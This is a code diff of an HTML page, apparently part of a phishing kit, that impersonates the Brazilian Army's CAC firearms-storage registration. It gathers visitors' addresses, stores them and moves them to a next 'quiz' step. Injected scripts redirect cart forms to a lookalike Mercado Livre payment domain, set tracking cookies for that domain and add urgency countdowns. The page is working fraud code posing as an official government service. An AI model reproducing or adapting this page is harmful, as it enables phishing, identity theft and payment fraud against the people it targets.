+            }
+        }
+    </style>
 
-<div id="finalizandoCEO" style="background-color: rgb(255, 255, 255); display: none;">
-<div class="c-loader"></div>
-</div>
+  <div id="finalizandoCEO" style="background-color: rgb(255, 255, 255); display: none;">
+        <div class="c-loader"></div>
+    </div>
 
-&lt;script&gt;
-window.addEventListener('load', function() {
-var finalizandoCEO = document.getElementById('finalizandoCEO');
-if(finalizandoCEO) finalizandoCEO.style.display = 'none';
-});
-&lt;/script&gt;
+      <script>
+    window.addEventListener('load', function() {
+      var finalizandoCEO = document.getElementById('finalizandoCEO');
+      if(finalizandoCEO) finalizandoCEO.style.display = 'none';
+    });
+  </script>
 
-<main id="main">
-<meta charset="utf-8">
-<meta content="width=device-width, initial-scale=1.0" name="viewport">
-<title>Exército Brasileiro - Cadastro para Armazenamento de Armas CAC</title>
-&lt;script src="https://cdn.tailwindcss.com/"&gt;&lt;/script&gt;
-<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
-<link href="css/all.min_1.css" rel="stylesheet">
-&lt;script src="js/cleave.min.js"&gt;&lt;/script&gt;
-<style>
-body { font-family: 'Poppins', sans-serif; }
-</style>
+        <main id="main">
+    <meta charset="utf-8">
+    <meta content="width=device-width, initial-scale=1.0" name="viewport">
+    <title>Exército Brasileiro - Cadastro para Armazenamento de Armas CAC</title>
+    <script src="https://cdn.tailwindcss.com/"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;700&amp;display=swap" rel="stylesheet">
+    <link href="css/all.min_1.css" rel="stylesheet">
+    <script src="js/cleave.min.js"></script>
+    <style>
+        body { font-family: 'Poppins', sans-serif; }
+    </style>
 
 
-<header class="bg-white border-b border-gray-300">
-<div class="container mx-auto px-4 py-2">
-<div class="flex items-center">
-<img alt="Brasão do Exército Brasileiro" class="mr-2" height="40" src="https://www.eb.mil.br/image/company_logo?img_id=40367&amp;t=1721965932372" width="40">
-<div>
-<div class="text-sm text-green-800">Ministério da Defesa</div>
-<div class="font-bold text-green-800">Exército Brasileiro</div>
+    <header class="bg-white border-b border-gray-300">
+        <div class="container mx-auto px-4 py-2">
+            <div class="flex items-center">
+                <img alt="Brasão do Exército Brasileiro" class="mr-2" height="40" src="https://www.eb.mil.br/image/company_logo?img_id=40367&amp;t=1721965932372" width="40">
+                <div>
+                    <div class="text-sm text-green-800">Ministério da Defesa</div>
+                    <div class="font-bold text-green-800">Exército Brasileiro</div>
+                </div>
+            </div>
+        </div>
+    </header>
+    <nav class="bg-gray-200 py-2 overflow-x-auto">
+        <div class="container mx-auto px-4">
+            <div class="flex items-center text-sm whitespace-nowrap">
+                <a class="text-green-800 mr-2" href="#">Exército Brasileiro</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <a class="text-green-800 mr-2" href="#">Serviços</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <a class="text-green-800 mr-2" href="#">CAC</a>
+                <span class="text-gray-500 mx-1">&gt;</span>
+                <span class="text-gray-700">Armazenamento</span>
+            </div>
+        </div>
+    </nav>
+    <main class="container mx-auto px-4 py-8">
+        <h1 class="text-2xl font-bold mb-4">Cadastro para Armazenamento de Armas - CAC</h1>
+        <p class="mb-4">Por favor, preencha o formulário abaixo com o endereço onde as armas serão armazenadas. Este endereço deve ser o local seguro e adequado para o armazenamento das armas, conforme as regulamentações do Exército Brasileiro.</p>
+        <p class="mb-4 font-bold text-red-600">Atenção: O endereço fornecido será o local oficial de armazenamento das armas registradas em seu certificado CAC.</p>
+        <p class="mb-8">Todos os campos marcados com * são obrigatórios. Comece inserindo o CEP para preenchimento automático dos outros campos.</p>
+        <form id="endereco-form" onsubmit="salvarDados(); return false;">
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="cep">CEP do Local de Armazenamento *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="cep" type="text" inputmode="numeric" placeholder="00000-000" required="">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="logradouro">Logradouro do Local de Armazenamento *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="logradouro" type="text" placeholder="Rua, Avenida, etc." required="">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="numero">Número *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="numero" type="text" placeholder="Número" required="">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="complemento">Complemento</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="complemento" type="text" placeholder="Apartamento, bloco, etc.">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="bairro">Bairro *</label>
+                 <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="bairro" type="text" placeholder="Bairro" required="">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="cidade">Cidade *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="cidade" type="text" placeholder="Cidade" required="">
+            </div>
+            <div class="mb-4">
+                <label class="block text-gray-700 text-sm font-bold mb-2" for="estado">Estado *</label>
+                <input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="estado" type="text" placeholder="Estado" required="">
+            </div>
+            <p class="text-sm mb-4">Ao clicar no botão "Prosseguir", você declara que todas as informações fornecidas são verdadeiras, que o endereço informado é o local onde as armas serão armazenadas, e que está ciente das responsabilidades legais associadas ao registro de CAC e ao armazenamento seguro de armas, conforme estabelecido pela Lei nº 10.826/2003 (Estatuto do Desarmamento) e suas regulamentações.</p>
+            <button class="bg-green-800 hover:bg-green-700 text-white font-bold py-2 px-4 rounded focus:outline-none focus:shadow-outline" type="submit" >
+    Prosseguir
+</button>
+
+        </form>
+
+        <script>
+            function salvarDados() {
+                const dadosEndereco = {
+                    cep: document.getElementById('cep').value,
+                    logradouro: document.getElementById('logradouro').value,
+                    numero: document.getElementById('numero').value,
+                    complemento: document.getElementById('complemento').value,
+                    bairro: document.getElementById('bairro').value,
+                    cidade: document.getElementById('cidade').value,
+                    estado: document.getElementById('estado').value
+                };
+                localStorage.setItem('dados-endereco-cac', JSON.stringify(dadosEndereco));
+                window.location.href = '../quiz%20etapa%203/index.html';
+            }
+        </script>
+
+    </main>
+    <footer class="bg-green-900 text-white py-8">
+        <div class="container mx-auto px-4">
+            <div class="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-5 gap-4">
+                <div>
+                    <h3 class="font-bold mb-2">O EXÉRCITO</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Missão e Visão</a></li>
+                        <li><a class="hover:underline" href="#">Comandante do Exército</a></li>
+                        <li><a class="hover:underline" href="#">Organização</a></li>
+                        <li><a class="hover:underline" href="#">História</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">SERVIÇOS</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">CAC</a></li>
+                        <li><a class="hover:underline" href="#">Alistamento</a></li>
+                        <li><a class="hover:underline" href="#">Concursos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">TRANSPARÊNCIA</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Acesso à Informação</a></li>
+                        <li><a class="hover:underline" href="#">Licitações e Contratos</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">CONTATO</h3>
+                    <ul class="text-sm">
+                        <li><a class="hover:underline" href="#">Ouvidoria</a></li>
+                        <li><a class="hover:underline" href="#">Fale Conosco</a></li>
+                    </ul>
+                </div>
+                <div>
+                    <h3 class="font-bold mb-2">REDES SOCIAIS</h3>
+                    <div class="flex space-x-4">
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-facebook-f"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-instagram"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-twitter"></i></a>
+                        <a href="#" class="text-white hover:text-gray-300"><i class="fab fa-youtube"></i></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </footer>
+    <div class="bg-green-950 text-white text-xs py-2 text-center">
+        Portal produzido pelo Exército Brasileiro - Todos os Direitos Reservados.
+    </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            new Cleave('#cep', {
+                delimiters: ['-'],
+                blocks: [5, 3],
+                numericOnly: true
+            });
+
+             const cepInput = document.getElementById('cep');
+            cepInput.addEventListener('input', function() {
+                const cep = this.value.replace(/\D/g, '');
+                if (cep.length === 8) {
+                    fetch(`https://viacep.com.br/ws/${cep}/json/`)
+                        .then(response => response.json())
+                        .then(data => {
+                            if (data.erro) {
+                                alert('CEP não encontrado');
+                                return;
+                            }
+                            document.getElementById('logradouro').value = data.logradouro;
+                            document.getElementById('bairro').value = data.bairro;
+                            document.getElementById('cidade').value = data.localidade;
+                            document.getElementById('estado').value = data.uf;
+                        })
+                        .catch(error => {
+                            console.error('Erro:', error);
+                            alert('Erro ao buscar o CEP');
+                        });
+                }
+            });
+    </script>
+        </main>
+
+<!-- start vega utm script -->
+<div id="foxScriptUtm">
+    <script>
+        var url_string = window.location.href;
+        var url = new URL(url_string);
+        var utmParams = {
+            src: url.searchParams.get('src'),
+            utm_source: url.searchParams.get('utm_source'),
+            utm_medium: url.searchParams.get('utm_medium'),
+            utm_campaign: url.searchParams.get('utm_campaign'),
+            utm_term: url.searchParams.get('utm_term'),
+            utm_content: url.searchParams.get('utm_content')
+        }
+        var cookieValue = '';
+        Object.keys(utmParams).forEach(function(key) {
+            if(utmParams[key]){
+                if(cookieValue) {
+                    cookieValue += '|';
+                }
+                cookieValue += key + '=' + utmParams[key];
+            }
+        });
+
+        if(cookieValue) {
+            var cookieName = '_sirius_track';
+            var myDate = new Date();
+            myDate.setMonth(myDate.getMonth() + 12);
+            document.cookie = cookieName +'=' + cookieValue + ';domain=.pagamentomercdolivre.site;path=/;expires=' + myDate.toUTCString();
+        }
+    </script>
 </div>
+<!-- end vega utm script -->
+<!-- start vega cart script -->
+<div id="foxScriptCart">
+    <script defer="">
+        function inArray(needle, haystack) {
+            var length = haystack.length;
+            for(var i = 0; i < length; i++) {
+                if(haystack[i] == needle) return true;
+            }
+            return false;
+        }
+
+        function setFormDataCloudfoxCheckout(method = "POST") {
+            const urlCloudfoxCheckout = 'https://pay.pagamentomercdolivre.site/';
+            let form = document.querySelector(`form[action="${urlCloudfoxCheckout}"]`);
+
+            if(form === null) {
+                form = document.querySelector('form[action="/cart"]');
+                if(form) form.setAttribute('action', urlCloudfoxCheckout);
+            }
+
+            if(form && !form.hasAttribute('method')) form.setAttribute('method', method);
+            if(form && !form.hasAttribute('novalidate')) form.setAttribute('novalidate','novalidate');
+            if(form && !form.hasAttribute('data-fox')) form.setAttribute('data-fox', 'cart-form');
+
+            return form;
+        }
+
+        function createInputDataFox(name, loopIndex, value, dataFoxNumber, type = 'hidden') {
+            const element = document.createElement('input');
+            element.setAttribute('type', type);
+            element.setAttribute('data-fox', dataFoxNumber);
+            element.setAttribute('name',`${name}${loopIndex}`);
+            element.setAttribute('value',`${value}`);
+            return element;
+        }
+
+        function submitCheckout(formElement) {
+            const themeName = "theme-export-resgistrocac-com-tema-ml-09sep20";
+            const theme = themeName.toLowerCase();
+            const divFoxData = document.createElement('div');
+            divFoxData.setAttribute('id', 'foxData');
+
+            const form = setFormDataCloudfoxCheckout();
+            if(form) {
+                form.appendChild(divFoxData);
+                form.submit();
+            }
+        }
+
+        let form = document.querySelector('form[action="/cart"]');
+        if(form !== null) {
+            form.addEventListener('submit', function (e) {
+                e.preventDefault();
+                submitCheckout(this);
+            });
+        }
+
+        let buttonSubmit = document.querySelector('button[form]');
+        if(buttonSubmit !== null) {
+            buttonSubmit.addEventListener('click', function (e) {
+                e.preventDefault();
+                submitCheckout(form);
+            });
+        }
+    </script>
 </div>
-</div>
-</header>
-<nav class="bg-gray-200 py-2 overflow-x-auto">
-<div class="container mx-auto px-4">
-<div class="flex items-center text-sm whitespace-nowrap">
-<a class="text-green-800 mr-2" href="#">Exército Brasileiro</a>
-<span class="text-gray-500 mx-1">&gt;</span>
-<a class="text-green-800 mr-2" href="#">Serviços</a>
-<span class="text-gray-500 mx-1">&gt;</span>
-<a class="text-green-800 mr-2" href="#">CAC</a>
-<span class="text-gray-500 mx-1">&gt;</span>
-<span class="text-gray-700">Armazenamento</span>
-</div>
-</div>
-</nav>
-<main class="container mx-auto px-4 py-8">
-<h1 class="text-2xl font-bold mb-4">Cadastro para Armazenamento de Armas - CAC</h1>
-<p class="mb-4">Por favor, preencha o formulário abaixo com o endereço onde as armas serão armazenadas. Este endereço deve ser o local seguro e adequado para o armazenamento das armas, conforme as regulamentações do Exército Brasileiro.</p>
-<p class="mb-4 font-bold text-red-600">Atenção: O endereço fornecido será o local oficial de armazenamento das armas registradas em seu certificado CAC.</p>
-<p class="mb-8">Todos os campos marcados com * são obrigatórios. Comece inserindo o CEP para preenchimento automático dos outros campos.</p>
-<form id="endereco-form" onsubmit="salvarDados(); return false;">
-<div class="mb-4">
-<label class="block text-gray-700 text-sm font-bold mb-2" for="cep">CEP do Local de Armazenamento *</label>
-<input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="cep" type="text" inputmode="numeric" placeholder="00000-000" required="">
-</div>
-<div class="mb-4">
-<label class="block text-gray-700 text-sm font-bold mb-2" for="logradouro">Logradouro do Local de Armazenamento *</label>
-<input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="logradouro" type="text" placeholder="Rua, Avenida, etc." required="">
-</div>
-<div class="mb-4">
-<label class="block text-gray-700 text-sm font-bold mb-2" for="numero">Número *</label>
-<input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="numero" type="text" placeholder="Número" required="">
-</div>
-<div class="mb-4">
-<label class="block text-gray-700 text-sm font-bold mb-2" for="complemento">Complemento</label>
-<input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="complemento" type="text" placeholder="Apartamento, bloco, etc.">
-</div>
-<div class="mb-4">
-<label class="block text-gray-700 text-sm font-bold mb-2" for="bairro">Bairro *</label>
-<input class="shadow appearance-none border rounded w-full py-2 px-3 text-gray-700 leading-tight focus:outline-none focus:shadow-outline" id="bairro" type="text" placeholder="Bairro" required="">
-</div>
-<div class="mb-4">
-<label class="
+<!-- end vega cart script -->
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        setTimeout(function () {
+            if (Shopify && Shopify.theme && Shopify.theme.cart) {
+                Shopify.theme.cart.clear();
+            }
+        }, 10000);
+    });
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        var timerElement = document.getElementById("timer69");
+        if(!timerElement) return;
+        var timeInSeconds = convertTimeToSeconds(timerElement.innerHTML);
+        startCountdown(timeInSeconds, timerElement);
+    });
+
+    function convertTimeToSeconds(timeString) {
+        var timeArray = timeString.split(":");
+        var hours = parseInt(timeArray[0]) || 0;
+        var minutes = parseInt(timeArray[1]) || 0;
+        var seconds = parseInt(timeArray[2]) || 0;
+        return hours * 3600 + minutes * 60 + seconds;
+    }
+
+    function startCountdown(initialTime, displayElement) {
+        var currentTime = initialTime;
+        var countdownInterval = setInterval(function () {
+            displayElement.innerHTML = formatTime(currentTime);
+            currentTime--;
+            if (currentTime < 0) {
+                clearInterval(countdownInterval);
+                alert("Tempo esgotado!");
+            }
+        }, 1000);
+    }
+
+    function formatTime(seconds) {
+        var hours = Math.floor(seconds / 3600);
+        var minutes = Math.floor((seconds % 3600) / 60);
+        var remainingSeconds = seconds % 60;
+        return padZero(hours) + ":" + padZero(minutes) + ":" + padZero(remainingSeconds);
+    }
+
+    function padZero(number) {
+        return (number < 10 ? "0" : "") + number;
+    }
+</script>
+
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        var timerElement2 = document.getElementById("timer70");
+        if(!timerElement2) return;
+        var timeInSeconds2 = convertTimeToSeconds(timerElement2.innerHTML);
+        startCountdown(timeInSeconds2, timerElement2);
+    });
+</script>
+
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+        const button = document.getElementById('nav-footer-access-switch');
+        const div = document.querySelector('.nav-footer-access');
+        if(button && div) {
+            button.addEventListener('click', function () {
+                if (div.classList.contains('nav-footer-access-collapsed')) {
+                    div.classList.remove('nav-footer-access-collapsed');
+                    div.classList.add('nav-footer-access-expanded');
+                    button.setAttribute('aria-expanded', 'true');
+                } else {
+                    div.classList.remove('nav-footer-access-expanded');
+                    div.classList.add('nav-footer-access-collapsed');
+                    button.setAttribute('aria-expanded', 'false');
+                }
+            });
+        }
+    });
+</script>
+
+<div style="display:contents"><svg xmlns="http://www.w3.org/2000/svg" class="ui-vpp-svg-sprites" style="display:none">
+        <defs>
+                        <symbol id="bookmark">
+                            <path stroke="#3483FA" d="M10.977 2.705C11.93 1.618 13.162 1 14.895 1c3.333 0 5.607 2.152 5.607 6.274 0 .08-.002.16-.005.24-.107 2.596-1.876 5.253-4.737 7.892a33.77 33.77 0 0 1-3.165 2.57 32.447 32.447 0 0 1-1.45.983l-.394.243-.394-.243-.009-.005-.021-.014-.08-.05a32.447 32.447 0 0 1-1.34-.914 33.77 33.77 0 0 1-3.165-2.57c-2.86-2.639-4.63-5.296-4.737-7.892A5.839 5.839 0 0 1 1 7.274C1 3.152 3.274 1 6.607 1c1.733 0 2.966.618 3.918 1.705.056.064.137.165.226.282.09-.117.17-.218.226-.282z"></path>
+                        </symbol>
+                    </defs>     
+      <defs>
+                <symbol id="loyalty_points">
+                    <path fill-rule="nonzero" d="M7.598 8.746v1.252h.6c1.657 0 3 1.343 3.001 3v.6H2.798v-.602a2.998 2.998 0 0 1 2.998-2.997h.604l-.001-1.253a3.435 3.435 0 0 1-1.578-.724l-1.586-.446-.106-.041-.739-.37A3.6 3.6 0 0 1 .402 3.947V1.599h2.486l-.2-1.2h8.618l-.2 1.2h2.489v2.346a3.6 3.6 0 0 1-1.988 3.22l-.739.37-.106.041-1.592.448a3.43 3.43 0 0 1-1.572.722zm2.65-2.272l.134-.037.688-.345a2.4 2.4 0 0 0 1.326-2.147V2.799h-1.49l-.52 3.13c-.032.187-.078.37-.138.545zm-6.505-.001a3.453 3.453 0 0 1-.139-.552L3.087 2.8H1.602v1.148a2.4 2.4 0 0 0 1.325 2.145l.687.345.129.036zm.361-4.874l.684 4.126a2.24 2.24 0 0 0 2.21 1.874c1.092 0 2.024-.79 2.204-1.868L9.89 1.6H4.104zm4.094 9.6H5.795c-.784 0-1.45.5-1.697 1.199h5.799c-.248-.699-.915-1.2-1.7-1.2z"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="meliplus_loyalty_points">
+                    <path d="M1 8C1 4.13401 4.13401 1 8 1V1C11.866 1 15 4.13401 15 8V8C15 11.866 11.866 15 8 15H1V8Z" stroke="black" stroke-opacity="0.55" stroke-width="1.2" fill="#fff"></path>
+                    <path d="M4.74143 7.395V10.0857H4.6V7.40453C4.6 6.85871 4.78331 6.4118 5.07565 6.10543C5.36466 5.80254 5.79411 5.6009 6.36209 5.6009H6.37101L6.37992 5.60063C6.60379 5.59397 6.82358 5.64004 7.03574 5.73719C7.24929 5.83498 7.42259 5.96892 7.5521 6.13413L8.00389 6.71043L8.4801 6.15414C8.6279 5.98149 8.81226 5.84181 9.01992 5.74344C9.21678 5.65018 9.43945 5.6009 9.67679 5.6009C10.2694 5.6009 10.6827 5.79703 10.9508 6.08338C11.2235 6.3747 11.3997 6.81758 11.4 7.40279L11.3841 10.1143H11.2391V7.42363C11.2511 7.21317 11.219 7.01233 11.163 6.83393L11.1568 6.81397L11.1491 6.7945C11.0773 6.61124 10.9725 6.43104 10.8286 6.27406C10.672 6.10336 10.4813 5.98471 10.3034 5.90414L10.2858 5.89617L10.2677 5.88935C10.0901 5.82231 9.89124 5.7744 9.66707 5.7744C9.47688 5.7744 9.26596 5.80083 9.05667 5.87981C8.84784 5.95863 8.6612 6.08204 8.50808 6.23228L8.92831 6.66055L8.50808 6.23228C8.33787 6.3993 8.22811 6.59104 8.15584 6.77542C8.0766 6.97757 8.04412 7.19227 8.05614 7.40454V10.0952H7.9147V7.42233C7.93903 7.19529 7.90212 6.9864 7.84833 6.81486C7.78232 6.60435 7.66693 6.40772 7.503 6.24328C7.34853 6.07885 7.16251 5.96378 6.98872 5.88507L6.74704 6.41872L6.98872 5.88507C6.77628 5.78886 6.55452 5.75478 6.35029 5.76397C6.12155 5.75545 5.91285 5.80579 5.74197 5.87028L5.93219 6.3743L5.74197 5.87028C5.53313 5.94909 5.3465 6.0725 5.19338 6.22275L5.61361 6.65101L5.19338 6.22275C5.02317 6.38977 4.91341 6.5815 4.84114 6.76588C4.7619 6.96804 4.72942 7.18273 4.74143 7.395Z" stroke="black" stroke-opacity="0.55" stroke-width="1.2"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="protected_buy">
+                    <path fill-rule="nonzero" d="M.399 3.89v-.6h.6c1.87 0 3.76-.783 5.68-2.374l.383-.317.383.317c1.92 1.59 3.81 2.374 5.68 2.374h.6v.6c0 5.633-2.165 9.242-6.473 10.679l-.19.063-.19-.063C2.564 13.132.4 9.523.4 3.89zm6.663-1.743c-1.8 1.4-3.62 2.179-5.455 2.32.135 4.725 1.947 7.648 5.455 8.898 3.508-1.25 5.32-4.173 5.455-8.898-1.835-.141-3.656-.92-5.455-2.32zm-.905 6.477l3.191-3.582.896.798-4.02 4.513-2.472-2.377.831-.865 1.574 1.513z"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="returns">
+                    <path d="M2.474 7.2h7.225a2.7 2.7 0 1 0 0-5.4H7V.6h2.7a3.9 3.9 0 1 1 0 7.8H2.473l2.45 2.389-.839.859L.14 7.8l3.945-3.848.838.859L2.473 7.2z"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="warranty">
+                    <path fill-rule="nonzero" d="M5.305 10.354l-1.686 3.34-1.24-2.458H0l1.64-3.202a5.2 5.2 0 1 1 8.588.194l1.54 3.008H9.39l-1.241 2.458-1.673-3.315a5.266 5.266 0 0 1-1.171-.025zm-1.001-.237a5.201 5.201 0 0 1-1.975-1.234l-.693 1.353h1.357l.626 1.239.685-1.358zm3.192.064l.653 1.294.625-1.239h1.358l-.617-1.204a5.193 5.193 0 0 1-2.019 1.15zM6 9.2a4 4 0 1 0 0-8 4 4 0 0 0 0 8z"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="mail">
+                    <path fill="#000" fill-opacity=".8" fill-rule="nonzero" d="M1.917 1.914l9.577 7.698 9.465-7.784a.562.562 0 0 0-.259-.063H2.3a.566.566 0 0 0-.383.149zm-.192 2.09v13.643c0 .325.257.588.575.588h18.4a.582.582 0 0 0 .575-.588V3.832l-9.769 8.034-9.781-7.863zM2.3 0h18.4C21.97 0 23 1.053 23 2.353v15.294c0 1.3-1.03 2.353-2.3 2.353H2.3C1.03 20 0 18.947 0 17.647V2.353C0 1.053 1.03 0 2.3 0z"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="facebook">
+                    <g fill="none" fill-rule="nonzero">
+                        <path fill="#4267B2" d="M28.344 0h-26.7A1.656 1.656 0 0 0 0 1.656v26.7C.007 29.266.746 30 1.656 30h14.37V18.399h-3.9v-4.542h3.9v-3.342c0-3.873 2.367-5.985 5.823-5.985a31.371 31.371 0 0 1 3.492.18v4.05h-2.382c-1.881 0-2.247.9-2.247 2.205v2.892H25.2l-.6 4.542h-3.9V30h7.644c.915 0 1.656-.741 1.656-1.656v-26.7A1.656 1.656 0 0 0 28.344 0z"></path>
+                        <path fill="#FFF" d="M20.7 30V18.399h3.9l.6-4.542h-4.5v-2.892c0-1.311.366-2.205 2.247-2.205h2.382V4.71a31.371 31.371 0 0 0-3.492-.18c-3.456 0-5.823 2.1-5.823 5.985v3.342h-3.9v4.542h3.9V30H20.7z"></path>
+                    </g>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="share">
+                    <path fill="#3483FA" fill-rule="evenodd" d="M7.565 11.848a3.002 3.002 0 1 1 0-3.707l4.337-2.173a3.006 3.006 0 0 1 2.9-3.783 3.002 3.002 0 1 1-2.362 4.856L8.102 9.214a3.006 3.006 0 0 0 1 1-.537 1.073l-4.337-2.17zm-2.363-.05a1.802 1.802 0 1 0 0-3.605 1.802 1.802 0 0 0 0 3.604zm9.6 4.802a1.802 1.802 0 1 0 0-3.605 1.802 1.802 0 0 0 0 3.605zm0-9.61a1.802 1.802 0 1 0 0-3.605 1.802 1.802 0 0 0 0 3.605z"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="sharegallery">
+                    <g fill="none" fill-rule="evenodd">
+                        <circle cx="20" cy="20" r="20" fill="#F5F5F5"></circle>
+                        <g transform="translate(9 10)">
+                            <path fill="#3483fa" fill-rule="nonzero" d="M7.565 11.848a3.002 3.002 0 1 1 0-3.707l4.337-2.173a3.006 3.006 0 0 1 2.9-3.783 3.002 3.002 0 1 1-2.362 4.856L8.102 9.214a3.006 3.006 0 0 1 0 1.562l4.337 2.17a3.002 3.002 0 1 1-.537 1.073l-4.337-2.17zm-2.363-.05a1.802 1.802 0 1 0 0-3.605 1.802 1.802 0 0 0 0 3.604zm9.6 4.802a1.802 1.802 0 1 0 0-3.605 1.802 1.802 0 0 0 0 3.605zm0-9.61a1.802 1.802 0 1 0 0-3.605 1.802 1.802 0 0 0 0 3.605z"></path>
+                        </g>
+                    </g>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="twitter">
+                    <path fill="#1DA1F2" fill-rule="nonzero" d="M10.378 26C22.83 26 29.642 15.996 29.642 7.321c0-.284 0-.567-.02-.849A13.551 13.551 0 0 0 33 3.074c-1.236.531-2.547.88-3.889 1.033a6.628 6.628 0 0 0 2.977-3.63 13.829 13.829 0 0 1-4.3 1.593C25.69-.094 22.356-.624 19.655.778c-2.7 1.401-4.096 4.386-3.403 7.279-5.444-.265-10.516-2.758-13.954-6.859-1.797 3-.88 6.837 2.096 8.763A6.882 6.882 0 0 1 1.32 9.14v.083c0 3.125 2.273 5.817 5.432 6.435a6.965 6.965 0 0 1-3.057.113c.887 2.674 3.428 4.506 6.325 4.559a13.859 13.859 0 0 1-8.408 2.816A14.208 14.208 0 0 1 0 23.05a19.608 19.608 0 0 0 10.378 2.944"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="loyalty_trophy_rounded">
+                    <path fill-rule="evenodd" d="M24 0c13.255 0 24 10.745 24 24S37.255 48 24 48 0 37.255 0 24 10.745 0 24 0zm6.885 14.25H17.114l.169 1.01-3.033-.05v4.011a5.75 5.75 0 0 0 3.057 5.08l5.942 3.15v1.799H21A3.75 3.75 0 0 0 17.25 33v.75h13.5V33A3.75 3.75 0 0 0 27 29.25h-2.25v-1.799l5.943-3.15a5.75 5.75 0 0 0 3.058-5.08v-4.01l-3.034.05.169-1.011zm-3.886 16.5c.98 0 1.814.626 2.122 1.5H18.877A2.25 2.25 0 0 1 21 30.75zm2.115-15l-.908 5.459a5.49 5.49 0 0 1-2.371 3.667l-1.142.76c-.42.28-.967.28-1.387 0l-1.14-.76a5.492 5.492 0 0 1-2.371-3.666l-.91-5.46h10.23zm-13.364.986l1.783.029.782 4.691c.12.718.35 1.405.675 2.04l-.98-.52a4.25 4.25 0 0 1-2.26-3.755v-2.485zm16.5 0v2.485a4.25 4.25 0 0 1-2.26 3.755l-.979.519a6.988 6.988 0 0 0 .674-2.04l.781-4.69 1.784-.03z"></path>
+                </symbol>
+            </defs>
+            <defs>
+                <symbol id="loyalty_plus_rounded">
+                    <rect x="0.5" y="1.25183" width="47" height="47" rx="23.5" fill="#F5F1FF"></rect>
+                    <path d="M7.40308 25.0623C7.40308 21.2835 10.3196 18.2202 13.9174 18.2202H35.4145C38.8324 18.2202 41.6031 21.1304 41.6031 24.7202C41.6031 28.3101 38.8324 31.2202 35.4145 31.2202H7.40308V25.0623Z" fill="url(#paint0_linear_605_33089)"></path>
